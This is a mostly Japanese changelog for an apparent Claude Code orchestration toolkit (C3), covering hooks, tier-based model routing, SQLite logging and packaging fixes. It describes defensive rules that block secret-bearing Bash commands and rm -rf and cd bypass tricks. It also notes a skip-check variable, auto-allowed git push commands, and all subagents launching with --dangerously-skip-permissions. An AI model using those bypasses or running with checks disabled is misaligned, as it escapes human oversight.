- v1.1.0 の wheel に開発元リポジトリの `.claude/state/tier_selection.json`（hooks が実行時に書き出す一時ファイル）が混入していた問題を修正。`c3 update` 実行時に利用先プロジェクトに「開発元の最後の Tier 選択結果」がコピーされてしまっていた。
- 恒久対策として `src/c3/_excludes.py` / `hatch_build.py` の `EXCLUDE_PATTERNS` を `state/c3.db*` から `state/*`（`KEEP_PATTERNS` の `state/.gitkeep` のみ残す）に変更。今後 `state/` 配下に新規ファイルが増えても自動的に配布除外される。
- `.gitignore` も同様に `.claude/state/c3.db*` 3 行から `.claude/state/*` + `!.claude/state/.gitkeep` に変更。

### 内部

- `.claude/settings.json` の permission allow 一覧に `git tag*` / `git push origin main` / `git push origin v*` / `gh release create v*` / `gh release view v*` を追加（リリース作業の自動化）。

### 既存利用先への対応

- v1.1.0 を `c3 update` で導入済みの場合、`.claude/state/tier_selection.json` が残っている可能性がある。次回プロンプトで上書きされるか、`record_tier_outcome.py` 実行時に削除されるため副作用は無いが、気になる場合は手動で削除可。

## [1.1.0] - 2026-05-09

### マイルストーン

第 5 波として F-005（Tier 自動ルーティング）の Phase 2 を A/B/C すべて完成。1.0.0 までは「推奨 Tier を `additionalContext` で提示するだけ」の MVP だったが、本リリースで PO 経由のサブエージェントについては **起動時の model を Tier 推奨で動的上書き** するレコメンダーから自動オペレーターへ進化した。さらに過去類似タスクからの complexity 補正と、Haiku 連続失敗時の自動エスカレーションを追加し、F-005 全体の精度・コスト最適化が機能するようになった。

### 追加（第 5 波）

#### F-005 Phase 2-A: model 動的切替（PO 経由）

- `src/parallel_orchestra/manifest.py`: `Task` dataclass に `model_override: str | None`、`Defaults` に `model: str | None` を追加。許可値は `haiku`/`sonnet`/`opus`。`_KNOWN_TASK_KEYS` / `_KNOWN_DEFAULTS_KEYS` に `model` を許可。
- `src/parallel_orchestra/runner.py`: `_resolve_effective_model()` / `_read_tier_selection()` を新規追加。優先順位は (1) `tier_selection.json` の `suggested_model` → (2) `Task.model_override` → (3) `Defaults.model` → (4) frontmatter。値がある場合は `claude --agents '{"<agent>":{"model":"<tier>"}}'` で起動、無ければ既存の `--agent <name>` で後方互換。
- `.claude/hooks/select_tier.py`: `tier_selection.json` payload に `suggested_model` フィールドを追加（tier 名と model 短縮名は同一）。
- 新規テスト: `tests/parallel_orchestra/test_runner_model_override.py`（14 ケース、優先順位 4 パターン + フォールバック含む）。
- スコープ: PO 経由のサブエージェントのみ。親 Claude の Agent ツール経由は公式 API に動的 model 指定手段が無く対象外（CHANGELOG / dev-workflow.md で明示）。

#### F-005 Phase 2-B: Haiku 失敗フォールバック（次回補正のみ）

- `.claude/hooks/schema.sql` に `tier_recent_outcomes` テーブルを新規追加（直近 outcome を保持）。`SCHEMA_VERSION` を 1 → 2 に bump。
- `src/parallel_orchestra/c3_db.py` に `record_tier_recent_outcome()` / `read_tier_failure_rate()` を追加。直近 N 件（既定 10、最小サンプル数 5）から failure rate を計算。
- `.claude/hooks/select_tier.py` に `maybe_escalate()` を実装。Beta サンプリング後、failure rate ≥ 0.5 で 1 段昇格（haiku → sonnet, sonnet → opus）。opus は最上位なので昇格なし。`tier_selection.json` に `escalated: true` / `escalation_reason` を残す。
- `.claude/hooks/record_tier_outcome.py`: tier_bandit 更新と並行して `tier_recent_outcomes` にも 1 件追記。
- 新規テスト: `tests/hooks/test_select_tier_escalation.py`（10 ケース、境界値・サンプル不足・opus 抑止を含む）。
- 設計判断: 同一プロンプト retry はせず「次回プロンプトの選択補正」のみ。倍コストと PO retry 機構との二重化を避けるため案 A を採用。

#### F-005 Phase 2-C: 類似度推定（complexity 推定の精度向上）

- 新規 `.claude/logs/prompt-history.jsonl`（実行時生成、`.gitignore` / `EXCLUDE_PATTERNS` で配布除外済み）。
- `.claude/hooks/select_tier.py`: `difflib.SequenceMatcher` で過去プロンプトとの類似度を計算。threshold 0.8 以上で complexity を上書き、0.6-0.8 は信頼度補強のみ。`tier_selection.json` に prompt 情報（prefix 200 文字 + SHA256 先頭 16 文字）を含める。末尾 1000 行のみ `collections.deque` で読み込み（O(n) のスキャンを抑制）。
- `.claude/hooks/record_tier_outcome.py`: tier_selection.json から prompt 情報を読み、`prompt-history.jsonl` に 1 行追記。旧フォーマット（prompt 情報なし）はスキップする後方互換。
- 新規テスト: `tests/hooks/test_similarity_boost.py`（14 ケース）+ `tests/hooks/test_record_tier_outcome.py` に 4 ケース追加。
- プライバシー対策: prefix 200 文字 + SHA256 16 文字のみ保存し、フルプロンプトは保存しない。

### 注意（既存利用先への影響）

- PO の動的 model 切替は **PO 経由のサブエージェントのみ** 対象。dev-workflow フェーズ A/B/C/E や対話中の Agent ツール経由は依然 frontmatter 指定が優先される。コスト最適化したい場合は手動切替が必要。
- `.claude/state/c3.db` は `SCHEMA_VERSION` 2 に bump されるが、`CREATE TABLE IF NOT EXISTS` のみで既存 DB を破壊しない（マイグレーション不要）。
- `.claude/logs/prompt-history.jsonl` は新規生成される。`.gitignore` / `EXCLUDE_PATTERNS` で除外済みのため利用先プロジェクトに git 汚染は出ない。

### 内部

- 新規テスト追加: 14（Phase 2-A）+ 10（Phase 2-B）+ 14 + 4（Phase 2-C）= **42 ケース**。
- 全体テスト: **705 passed / 3 skipped / 0 failed**（前バージョン 663 → 705、+42）。

## [1.0.0] - 2026-05-09

### マイルストーン

c3 追加予定機能リスト（10 機能 F-001 〜 F-010）を全て実装完了。第 1 波（F-006/007/008）→ 第 2 波（F-009 基盤）→ 第 3 波（F-001/002/004/010）→ 第 4 波（F-003/005）の段階的リリースが完了し、Ruflo 調査から派生した「自己観測 + 自己学習」C3 が 1.0 として一区切り。

### 追加（第 4 波）

#### F-003: PO 並列処理の状況可視化

- `src/parallel_orchestra/c3_db.py` に `upsert_po_status()` / `fetch_po_status()` を追加（SQLite 3.24+ の `INSERT ... ON CONFLICT ... DO UPDATE` で UPSERT、未知 state は警告のみで通過）。
- `src/parallel_orchestra/runner.py` の `_Dashboard` に `snapshot_states()`（thread-safe コピー）を追加。`_PO_STATUS_STATE_MAPPING` で内部 `_TaskStatus` → schema state の語彙変換を定義。新規 `_heartbeat_po_status_loop()` 関数で 30 秒ごとに状態を UPSERT（waiting タスクは除外）。
- `run_manifest()` で session_id を上部に移動（F-002 と F-003 で共有）、dashboard が enabled な場合のみ heartbeat スレッドを起動。`dashboard.stop()` の前に最終状態を 1 回 UPSERT してからスレッド停止。
- 新規 `.claude/skills/po-status/SKILL.md`（4 種の SELECT パターン: 直近 active / session 別 / stale 検出 / 全履歴）。
- `tests/parallel_orchestra/test_po_status_visibility.py` 新規追加（19 ケース）。

#### F-005: Tier 自動ルーティング（MVP）

- `src/parallel_orchestra/c3_db.py` に `read_tier_params()` / `update_tier_params()` を追加。各 Tier の Beta(α, β) を行が無ければ `Beta(1,1)` で初期化扱い、UPSERT で α または β を加算、trials+=1。
- 新規 `.claude/hooks/select_tier.py`（UserPromptSubmit hook）: 複雑度を文字数 + キーワードで simple/medium/complex に推定。合計 trials < 30 は uniform random（学習データ収集期）、≥ 30 は `random.betavariate()` による純 Thompson Sampling で Tier 選定。結果を `.claude/state/tier_selection.json` に保存し、`additionalContext` で「推奨 Tier: sonnet（信頼度 trials=12）」を返す。
- 新規 `.claude/hooks/record_tier_outcome.py`（CLI）: dev-workflow から `--outcome success/failure` で呼ばれて α/β を更新、json を削除（DB 不在時は json 維持してリトライ可能）。
- `.claude/settings.json` の `UserPromptSubmit` セクションを新規追加し `select_tier.py` を登録。
- `.claude/skills/dev-workflow/SKILL.md` フェーズ E-2（最終承認）のみに `record_tier_outcome.py` 呼び出しを統合（多重カウント防止のため E-1 では呼ばない）。
- 新規テスト 30 ケース（`test_select_tier.py` 24 ケース + `test_record_tier_outcome.py` 6 ケース）。
- 依存ライブラリ追加なし（`random.betavariate()` で stdlib 完結）。
- **MVP スコープ**: 推奨提示のみ（agent の `model:` フロントマター動的書き換えは次フェーズ）。

### MVP として残した拡張ポイント

- F-002 Phase 2: PO の worktree 内からの直接 SQLite 書き込み（環境変数で DB パス共有）。
- F-004: patterns.json の自動 promotion 判定変更、auto-memory への直接書き込み、LLM 要約による集約。
- F-005: agent の `model:` フロントマター動的書き換え、Haiku 失敗時の Sonnet 自動昇格、過去類似タスクからの complexity 類推。

### 注意（既存利用先への影響）

- `UserPromptSubmit` hook が新規登録される。プロンプト送信時に毎回 `additionalContext` で推奨 Tier が表示されるようになる。
- `Stop` hook は既に F-004 で追加された `consolidate_memory.py` がいる。第 4 波で Stop 周りの追加変更はない。
- レビューフロー（dev-workflow フェーズ E-2）の最終承認時に `record_tier_outcome.py` が呼ばれて c3.db に記録される。記録失敗時は `tier_selection.json` が残るが、次回プロンプトで上書きされるため副作用なし。

### 内部

- 新規テスト追加: 19（F-003）+ 30（F-005）= **49 ケース**。
- 全体テスト: **663 passed / 3 skipped / 0 failed**（前バージョン 614 → 663、+49）。

## [0.9.1] - 2026-05-09

### 修正

- F-004 で生成される `.claude/memory/consolidated_summary.md` が `.gitignore` および `EXCLUDE_PATTERNS` に登録されていなかったため、利用先プロジェクトで余計な untracked ファイルが残ってしまう問題を修正。`.gitignore` / `src/c3/_excludes.py` / `hatch_build.py` の 3 箇所に追加。

## [0.9.0] - 2026-05-09

### 追加（第 2 波・第 3 波）

#### F-009: DuckDB ハイブリッド構成（基盤）
- `pyproject.toml` の `dependencies` に `duckdb>=0.10` を追加（必須化）。
- 新規 `.claude/hooks/schema.sql`: 6 テーブル（`schema_version` / `review_decisions` / `po_results` / `po_status` / `tier_bandit` / `agent_runs`）の DDL を定義。
- 新規 `.claude/hooks/init_c3_db.py`: `.claude/state/c3.db` を WAL モードで初期化し、`CREATE TABLE IF NOT EXISTS` で冪等にスキーマ適用。失敗してもセッションを止めない。
- `.claude/settings.json` の `SessionStart` に登録（matcher 空で全セッション開始時に実行）。
- 配布版にも `.claude/state/.gitkeep` でディレクトリ確保。`c3.db` 本体は `.gitignore` / `EXCLUDE_PATTERNS` で除外。
- 書き込みは Python 標準 `sqlite3`、読み・分析は DuckDB の `sqlite_scanner` で ATTACH するハイブリッド構成。

#### F-010: タスク種別 → エージェント編成 skill
- 新規 `.claude/skills/task-routing/SKILL.md`: bug-fix / feature / refactor / security-audit / docs の 5 種別 × 対応エージェント編成テーブルを定義。
- AskUserQuestion での選択 → 編成提示 → 承認 → 起動の 4 Step フロー。新エージェント追加時は本 SKILL.md の編成テーブルも更新する旨を注記。

#### F-002: PO 集約レイヤ SQLite 化（Phase 1）
- 新規 `src/parallel_orchestra/c3_db.py`: `locate_c3_db()` / `record_task_results()` で TaskResult を `po_results` テーブルに INSERT。DB 不在時 / SQL エラー時は警告ログのみで PO 本体を止めない。
- `src/parallel_orchestra/runner.py`: `run_manifest()` 終了時に `record_task_results` を呼ぶ。`session_id` は `{manifest.name}_{started_at}` 形式で自動生成。
- Phase 2（worktree 内からの直接書き込み）は要望が出るまで保留。

#### F-001: レビュー判断ヒント機能
- `.claude/rules/code-review-checklist.md` / `security-review-checklist.md` の全項目（CR: 58 / SR: 47）に `[CR-XX-NNN]` / `[SR-XX-NNN]` 形式の ID を付与。
- `.claude/agents/code-reviewer.md` / `security-reviewer.md` の Workflow に「指摘時に該当 ID を併記」の指示を追加。
- `src/parallel_orchestra/c3_db.py` に `fetch_review_decisions` / `insert_review_decision` / `aggregate_decisions` ヘルパーを追加。
- 新規 `.claude/hooks/review_hint_inject.py`: レビューレポートから ID を抽出し、`c3.db.review_decisions` の過去判断を「## 過去判断ヒント」として末尾に追記。6 ヶ月超は `[要再評価]` ラベル、両レポートで同一 ID は ⚠ 重複指摘フラグを付与。
- 新規 `.claude/hooks/record_review_decision.py`: dev-workflow から判断を `c3.db` に INSERT する CLI ラッパー。
- `.claude/skills/dev-workflow/SKILL.md` フェーズ E に上記スクリプトの呼び出しを統合。

#### F-004: MemoryConsolidation 集約フック（MVP）
- `.claude/hooks/session_utils.py` に `extract_section()` を共通化（既存 `restore_session.py` の独自実装は後方互換のため残置）。
- 新規 `.claude/hooks/consolidate_memory.py`: 過去 7 日分の `.claude/memory/sessions/*.tmp` から「うまくいったアプローチ」「試みたが失敗したアプローチ」を抽出し、重複行除去 + 出現順保持で `.claude/memory/consolidated_summary.md` に出力。LLM 要約は使わず決定論的な単純行マージ。
- `.claude/settings.json` の `Stop` hook 配列に登録（既存 `stop.py` と並列実行）。
- patterns.json の自動 promotion 判定変更や auto-memory への直接書き込みは次フェーズで検討。

### 内部（テスト・運用ドキュメント）

- 新規テストファイル 4 件 / 計 47 ケース追加:
  - `tests/hooks/test_init_c3_db.py`（9 ケース）
  - `tests/parallel_orchestra/test_po_results_recording.py`（12 ケース）
  - `tests/hooks/test_review_hint_inject.py`(16 ケース）
  - `tests/hooks/test_consolidate_memory.py`（10 ケース）
- 全体テスト: **614 passed / 3 skipped / 0 failed**（前バージョン 567 → 614、+47）。
- 機能検討ドキュメント 4 件（`ruflo_research_result.md` / `c3候補機能への質問に対する回答.md` / `c3候補機能採用.md` / `c3追加予定機能リスト.md`）はローカル管理のみ（git / 配布物から除外）。

### 注意（既存利用先への影響）

- `pyproject.toml` の依存に DuckDB が追加された。`pip install --upgrade claude-code-conductor` で自動的に取り込まれる。Python 3.10 以上で動作する軽量パッケージ（wheel 10-30MB）。
- `SessionStart` 時に `.claude/state/c3.db` が自動生成される（無ければ作成、既存なら no-op）。利用先プロジェクトでは `.gitignore` に `.claude/state/c3.db*` を追加することを推奨。
- レビュー時の `code-reviewer` / `security-reviewer` の出力に `[CR-XX-NNN]` / `[SR-XX-NNN]` 形式の ID 表記が含まれるようになる。
- `Stop` 時に `.claude/memory/consolidated_summary.md` が自動更新される。

## [0.8.0] - 2026-05-08

### 追加（フック・第 1 波）

- **F-006: Bash 秘密情報検出フック**: `hooks/pre_tool.py` に正規表現ベースの判定を追加。`password=` / `api_key=` / `Bearer` / `token=` / `secret=` / `aws_secret_access_key=` / PEM 秘密鍵の 7 パターンを検出してブロックする。誤爆時は環境変数 `C3_SKIP_SECRET_CHECK=1` で bypass 可能。警告メッセージには検出値そのものを含めず、二次漏洩を防ぐ設計。これは既存 `security-review-checklist.md` の項目「秘密情報がログに出力されていないか」を実行前に自動化するもの。
- **F-007: Edit 後コード品質スキャンフック**: 新規 `hooks/post_tool.py` を追加し、Write / Edit 完了後にコード品質スキャンを実行する。`console.log` / `print(` / `TODO` / `FIXME` / `XXX` を検出して警告（**非ブロッキング**、`exit 0`）。対象拡張子は `.py` / `.js` / `.ts` / `.tsx` / `.jsx` / `.cs` / `.go` / `.rs`。バイナリ（先頭 8 KB に NUL バイトを含む）と 256 KB 超は先頭のみスキャン。`settings.json` の `PostToolUse` に既存 `validate_skill_change.py` と並列で登録。配布版にも含める。
- **F-008: SubagentStop メトリクス拡張**: `hooks/subagent_log.py` の `_SAFE_PAYLOAD_FIELDS` に `total_tokens` / `status` / `token_usage` / `model` を追加。Tier 自動ルーティング（学習ベースのモデル選択）の学習データ収集の前提となる。`result` 系は応答本文・コード断片の混入リスクがあるため引き続き除外。

### 注意（既存利用先への影響）

- F-006 は既存 Bash 実行に対して **新規ブロック動作** を導入する。`echo password=...` のような書式は今後ブロックされるため、誤爆した場合は `C3_SKIP_SECRET_CHECK=1` を設定して回避すること。
- F-007 は警告のみで非ブロッキング。既存 `validate_skill_change.py` と並列実行されるため、`.claude/skills/` 配下のファイル変更時は両方の hook が動く（出力重複は許容、責務分離優先）。

### 内部（テスト・除外設定）

- `tests/hooks/test_pre_tool.py` を新規追加（14 ケース）。既存 `rm -rf` 等のリグレッション防止 + F-006 各種検出 / 偽陽性回避 / bypass 動作を網羅。
- `tests/hooks/test_post_tool.py` を新規追加（15 ケース）。各パターン検出 / 対象外拡張子スキップ / バイナリスキップ / 大ファイル制限 / 言語制限を網羅。
- `tests/hooks/test_subagent_log.py` に `TestF008MetricsFieldsExtended` クラス（4 ケース）を追加。新フィールド記録 / `result` 除外維持 / 並列ペアリングの整合を検証。
- 全体テスト: **567 passed / 3 skipped / 0 failed**（既存 534 + 新規 33）。
- 機能検討ドキュメント 4 件（`ruflo_research_result.md` / `c3候補機能への質問に対する回答.md` / `c3候補機能採用.md` / `c3追加予定機能リスト.md`）を `.gitignore` と `EXCLUDE_PATTERNS`（`src/c3/_excludes.py` と `hatch_build.py` の両方）に追加し、git 追跡と wheel 配布の両方から除外。

## [0.7.1] - 2026-05-08

### 追加（開発者向け）

- `agents/`: developer / tester / code-reviewer / security-reviewer / systematic-debugger の 5 サブエージェントに `memory: project` フロントマターを付与。`.claude/agent-memory/<エージェント名>/MEMORY.md` が起動時にシステムプロンプトへ自動注入され、セッションをまたいだ知見蓄積が可能になった。配布版（`_template/`）には `agent-memory/` を含めず、利用側はゼロから蓄積する方針。
- `hooks/subagent_log.py`（C3 開発版専用）: SubagentStart / SubagentStop イベントの payload を `.claude/logs/agent-runs.jsonl` に追記する hook を追加。`payload.agent_id` ベースで Start / Stop をペアリングし `duration_seconds` を計算。配布版（`_template/`）からは `EXCLUDE_PATTERNS` で除外。

### 修正（`subagent_log.py` 堅牢化）

- U+2028 / U+2029 を JSON ASCII エスケープして JSONL 構造破壊を防止。
- payload をホワイトリスト方式でサニタイズし、`last_assistant_message` 等の長文・任意コンテンツが永続化されないように変更。
- `stdin` を 1 MB 上限・ログ走査を末尾 10,000 行に制限してメモリ DoS を防止。
- ファイル作成パーミッションを `0o700` / `0o600` に明示設定（POSIX）。
- `stdin` / `json.loads` 失敗時の `Exception` catch と record 非書き込みでフェイルセーフ化。
- `_append_log` の catch を `OSError` から `Exception` に拡大（`json.dumps` の `TypeError` 等も対応）。
- `collections.deque` ベースのペアリングで `popleft()` を `O(1)` 化、走査コストを削減。

### 内部（テスト・ドキュメント整備）

- `tests/hooks/test_subagent_log.py` を 6 → 19 ケースに拡張（U+2028 エスケープ・残留 Start・Stop 先着・サニタイズ・巨大 payload・`TypeError` 耐性・`main()` 戻り値検証など）。
- `tests/hooks/test_restore_session.py` を新規追加（13 ケース、`find_latest_session` / `extract_section` / `main` subprocess）。
- `tests/hooks/test_permission_handler.py` を新規追加（29 ケース、`load_rules` / `_glob_to_regex` / `matches_pattern` / `describe_tool` / `main` subprocess / `notify_on_auto`）。
- `.claude/docs/taxonomy.md`: `.claude/rules/` フロントマターの `description` キー記述を削除（公式仕様に存在しないため）。
- `.claude/CLAUDE.md`: コミットメッセージ・チェンジログ・リリースページの日本語記述ルールを追記。
- `.claude/settings.local.json`: SubagentStart / SubagentStop hook 登録と開発作業用 Bash 許可を追加。

## [0.6.4] - 2026-05-07

### Changed
- `CLAUDE.md`: 不要・重複・抽象的なセクションを削除・整理（Startup Protocol / Session Update Rules / Pattern Recording / Rule Compliance を削除、Communication Style・User Interaction Rules・Approval Flow・Compact Instructions・Available Commands・Directory Structure を整理・圧縮）
- `agents/`: `report-timestamp` スキル呼び出しとファイル出力の記述を全エージェントで統一（architect・code-reviewer・doc-writer・interviewer・planner・security-reviewer）
- `skills/`: `.claude/skills/` プレフィックスなしのパス参照を修正（code-review・dev-workflow・develop・start・wave-execution）
- `skills/dev-workflow/SKILL.md`: `commands/` の記述を `skills/` に更新、description に wave-execution を参照元として追記
- `README.md`: パターン昇格パス・c3 po コマンド一覧・PO 並列実行の説明・エージェント一覧（tdd-develop・systematic-debugger 追加）を現状に合わせて修正

## [0.6.3] - 2026-05-07

### Fixed
- `read_only=true` tasks (e.g. `code-reviewer`, `security-reviewer`) were
  launched with `--read-only`, a flag that does not exist in Claude Code CLI,
  causing immediate failure. All tasks now use `--dangerously-skip-permissions`
  regardless of `read_only`. `read_only` controls worktree creation only and
  is never passed to the `claude` binary.
- `wave-execution/SKILL.md`: update timeout note from 900 s (15 min) to
  1200 s (20 min) to reflect the v0.6.1 change.

## [0.6.2] - 2026-05-07

### Fixed
- `c3 update` no longer copies `.claude/logs/` files into the destination
  project. `logs/*` is now listed in `EXCLUDE_PATTERNS` in both
  `hatch_build.py` and `src/c3/_excludes.py`.

## [0.6.1] - 2026-05-07

### Changed
- Raise default agent timeout from 900 s to 1200 s (`_INTERNAL_TIMEOUT_SEC`).
- Raise default parallel worker count from 3 to 5 (`_DEFAULT_MAX_WORKERS`).

## [0.6.0] - 2026-05-07

### Changed
- **Bundled `parallel-orchestra` (PO) into the C3 distribution.** PO is now
  part of the same wheel as C3; users no longer need to `pip install
  parallel-orchestra` separately. The `parallel-orchestra` CLI command is
  still exposed as a console script for backward compatibility.
- `c3.po.run.run_manifest` now calls `parallel_orchestra.run_manifest`
  directly via the Python API instead of spawning a `parallel-orchestra`
  subprocess. The `subprocess` round-trip and ANSI-stream parsing are
  removed; PO failures surface as typed `ManifestError` / `RunnerError`
  exceptions and are mapped to C3 exit codes.
- `c3.po.manifest` now uses `yaml.safe_load` (via the new `PyYAML>=6.0`
  dependency) for frontmatter parsing. The ~200-line homegrown YAML
  subset parser is removed.
- `c3 doctor` now reports the bundled PO version instead of probing for a
  separately installed `parallel-orchestra` binary on PATH.

### Removed (post-bundling cleanup)
- **Webhook notifications** (`on_complete` / `on_failure` / `webhook_url`)
  removed from the manifest schema, parser, and runner. C3 never used
  webhooks (they were dropped explicitly in `build_wave_manifest_text`).
  Roughly 160 LOC of dispatch/SSRF-mitigation code and `urllib.request`
  imports are gone.
- **`--resume` and `RunState`**: `parallel_orchestra/run_state.py`
  deleted. The `parallel-orchestra run --resume` flag is removed; C3
  commits each wave on completion so partial-run restoration is
  unnecessary. Roughly 240 LOC and the `resumed` field on `TaskResult`
  are gone.
- **`parallel_orchestra/__main__.py`** removed. Use the
  `parallel-orchestra` console script (or `c3 po run`) instead of
  `python -m parallel_orchestra`.
- **PO CLI options** that C3 doesn't expose: `--log-dir` / `--no-log`
  / `--dashboard` / `--no-dashboard` / `--dry-run` (C3 has its own
  `c3 po dry-run` subcommand). The `format_dry_run` helper is
  removed.
- `src/c3/po/detect.py` and the `RunStatus="not_installed"` branch — PO
  is always available now that it ships with C3.
- The "PO is not installed" guidance in `wave-execution` Step 0 and the
  "optional install" section of the README; replaced with a note that
  PO is bundled.
- **PO public API trimmed**: `parallel_orchestra` now re-exports only
  `run_manifest`, `load_manifest`, `RunResult`, `ManifestError`,
  `RunnerError`, and `ParallelOrchestraError`. `Defaults`, `Manifest`,
  `Task`, `TaskResult`, `WebhookConfig`, `SUPPORTED_PLAN_VERSIONS`,
  and `generate_report` are no longer top-level exports (still
  accessible via `parallel_orchestra.manifest` /
  `parallel_orchestra.runner` for advanced callers).

### Added
- `PyYAML>=6.0` runtime dependency.
- `tests/parallel_orchestra/` — PO's test suite is now run as part of
  the C3 test run (`pytest tests/`).
- `[tool.pytest.ini_options]` block declaring `testpaths` and the
  `slow` marker (carried over from PO's pyproject.toml).
- Explicit `_check_duplicate_task_ids` validation in
  `parallel_orchestra.load_manifest`. Previously duplicate IDs were
  caught only indirectly via `depends_on` reference checks.

### Changed (post-bundling cleanup)
- `c3.po.manifest.validate_manifest` now delegates structural
  validation to `parallel_orchestra.load_manifest` and only adds the
  C3-specific check that each task's `agent` resolves to a file under
  `.claude/agents/`. The duplicated po_plan_version / name / cwd /
  task-field checks are removed (~70 LOC).
- `c3.po.manifest._yaml_quote` reuses `json.dumps(..., ensure_ascii=False)`
  for double-quoted YAML scalars instead of hand-rolled escaping.

## [0.5.1] - 2026-05-05

### Added
- New `/pattern-status` skill (read-only) that visualizes `patterns.json`:
  trust score distribution, promotion candidates, expiry-near patterns,
  and already-promoted patterns. Use it before `/promote-pattern` to
  inspect the current state without modifying the file.
- `session_utils.append_checkpoint(session_file, label, summary)` helper
  for milestone state snapshots. Safely handles non-existent and empty
  session files by writing the template before appending. Used by both
  `wave-execution` (success/skipped-failure waves) and `pre_compact.py`.
- `CLAUDE.md` "When to use /compact" guideline — decision flow for
  `/compact` vs session restart, aimed at clarifying the choice for
  power users (restart) vs casual users (`/compact`).

### Changed
- `pre_compact.py` now emits `hookSpecificOutput.additionalContext` to
  inject KEEP/DISCARD save instructions into Claude's context just
  before compaction. Previously the hook only wrote a timestamp marker
  to the session file. Claude now writes important state (remaining
  tasks, key decisions, resolved gotchas) to the session before the
  context shrinks.
- `wave-execution` Step 2-F now records a checkpoint block to the
  session file on every wave completion (success or skipped failure),
  in addition to flipping `[ ]` → `[x]`. This gives a time-stamped
  trail of milestones for `/init-session` and `/pattern-status`.
- Added `WebSearch` to `permissions.allow` in `settings.json` so
  research subagents can use it without prompting.

## [0.5.0] - 2026-05-05

### Added
- New `systematic-debugger` agent: dedicated investigation phase for
  root-cause analysis and pattern matching when `developer` gets stuck.
  Runs in a separate phase from implementation, preserving C3's
  multi-agent separation.
- `developer` agent: Stuck Signal — after 3 failed attempts at the
  same problem, write a `debug-needed` report and stop, letting the
  orchestrator dispatch `systematic-debugger`.
- `dev-workflow` D-2.5 and `worktree-tdd-workflow` Step 3.5: detect
  Stuck Signal, run systematic-debugger, re-invoke developer with the
  debug analysis injected.
- `tester` agent: Verify RED rule — before handing off to developer,
  confirm tests fail for the right reason (missing feature, not
  syntax errors), and document the verification in the test-report.
- `developer` agent: minimal code principle — Green phase writes
  only what tests require, no premature extensions or speculative
  abstractions.
- `developer` agent: lightweight verification before tester handoff
  (syntax/build check) drawn from superpowers' verification ideas
  while keeping C3's agent-separated structure.

## [0.4.0] - 2026-05-04

### Breaking Changes
- **Skill renamed**: `/review` → `/code-review` — avoids conflict with the
  official Claude Code `/review [PR]` command (which reviews pull requests).
  C3's `/code-review` runs `code-reviewer` + `security-reviewer` agents
  as dev-workflow phase E.
- **Skill renamed**: `/mcp` → `/mcp-config` — avoids conflict with the
  official Claude Code `/mcp` command (which manages live MCP connections).
  C3's `/mcp-config` manages `mcpServers` entries in `.claude/settings.json`.
- **Skill structure**: `commands/` directory migrated to `skills/` following
  the Claude Code 2026 skills standard. All skills are now under
  `.claude/skills/{name}/SKILL.md` with YAML frontmatter.

### Added
- `stop.py`: Records `last_assistant_message` from Stop hook payload into the
  session file's 事実ログ section as `- 最終応答: ...` (truncated at 500 chars).
  The next session's init-session can now read what Claude last accomplished.
- `session_utils.py`: New shared module exporting `SESSIONS_DIR`,
  `SESSION_JSON_MARKER`, `is_worktree()`, and `create_session_template()`.
  Eliminates duplicate definitions across `stop.py` and `pre_compact.py`.

### Fixed
- `settings.local.json` had a duplicate `hooks` section identical to
  `settings.json`, causing all hooks to fire twice per event. Removed.
- Hook commands now use `"$CLAUDE_PROJECT_DIR/.claude/hooks/…"` (absolute
  path via env var) so hooks remain findable even after `cd` changes CWD.
  The `cd` block in `pre_tool.py` has been removed as it is no longer needed.
- `UserPromptSubmit` hook for `statusline.py` removed — the hook input has no
  `context_window` field, so it always displayed `0%`. The `statusLine`
  setting handles display correctly on its own.
- `stop.py`: Reads and respects `stop_hook_active` flag — skips processing
  on re-entrant Stop calls to prevent duplicate session updates.
- `pre_compact.py`: Uses `__file__`-based paths instead of `os.getcwd()` so
  the session file is always found regardless of working directory.
- `pre_compact.py`: Records `trigger` (manual/auto) and `context_items_before`
  in checkpoint output for richer context.
- `stop.py`: Sanitizes surrogate characters (`\udc80`–`\udcff`) in
  `last_assistant_message` before writing to avoid `UnicodeEncodeError`.
- `settings.json`: Added missing `Write`/`Edit` permissions for
  `.claude/reports/archive/**`, `.claude/rules/**`, `.claude/settings.json`,
  `Edit(.claude/memory/**)`, `Edit(.claude/rules/**)`, `Edit(.claude/skills/**)`.
- Bash permissions for hook scripts now include both relative-path and
  `$CLAUDE_PROJECT_DIR`-prefixed forms for full coverage.

## [0.3.4] - 2026-05-02

### Security
- `pre_tool.py`: Hardened `rm -rf` detection — flags are now collected
  only from tokens immediately following the `rm` command, preventing
  false-negatives when earlier commands in a pipeline carry `-r`/`-f`
  flags (e.g. `grep -rf … && rm file`). Also added detection of
  `--recursive --force` long-option combinations.
- `pre_tool.py`: Extended `cd` block to cover subshell `$()`, backtick,
  newline, and `eval "cd …"` bypass paths that the previous regex missed.
- `stop.py`: Field whitelist on `patterns.json` writes — only
  allow-listed keys are written and `promoted` can never be injected
  via a session JSON block. Added `MAX_ID_LENGTH = 64` and
  `MAX_DESCRIPTION_LENGTH = 500` guards.
- `manifest.py`: `writes`, `agent`, and `concurrency_group` values in
  generated wave manifests are now passed through `_yaml_quote` to
  prevent newline injection into the ephemeral YAML.

### Fixed
- `run.py`: Replaced `assert process.stderr is not None` (silently
  removed by `-O` optimised bytecode) with an explicit
  `if … is None: raise RuntimeError(…)` guard.
- `pre_compact.py`: Replaced `os.path.exists()` + `open('w')` TOCTOU
  with `open('x')` + `except FileExistsError` — matches the pattern
  already used in `stop.py`.
- `stop.py`: `update_patterns` called `os.listdir` inside the pattern
  loop, causing O(N×M) file-system reads. A single `_build_sessions_by_date`
  call outside the loop reduces this to O(N+M).
- `manifest.py`: Removed dead branch `rest is None` (always `False`
  for `str.partition` return values). Double-quoted YAML scalars now
  handle `\\`, `\"`, `\n`, `\t`, and `\r` escape sequences.
- `cli_po.py`: `run-wave` temp manifest now uses `tempfile.NamedTemporaryFile`
  (unpredictable name) and is deleted in a `try/finally` block regardless
  of outcome.
- `cli_list.py`: `OSError` when reading a file in `_summary` is caught
  and returns `"(unreadable)"` instead of propagating and breaking the
  entire listing.
- `run.py`: Replaced `__import__("sys").stderr` idiom with `sys.stderr`.
- `manifest.py`: `validate_manifest` local `version` renamed to
  `plan_version` to avoid shadowing a potential future import.
  `build_wave_manifest_text` accepts an optional `waves` argument to
  avoid recomputing the wave graph when the caller already has it.

### Changed
- `pre_compact.py` / `stop.py`: `SESSION_JSON_MARKER = 'C3:SESSION:JSON'`
  constant is now defined in both files — eliminates the hard-coded
  string in `pre_compact.py` and makes the two files consistent.
- `stop.py`: Import block reordered to comply with PEP 8 (all imports
  before module-level statements).
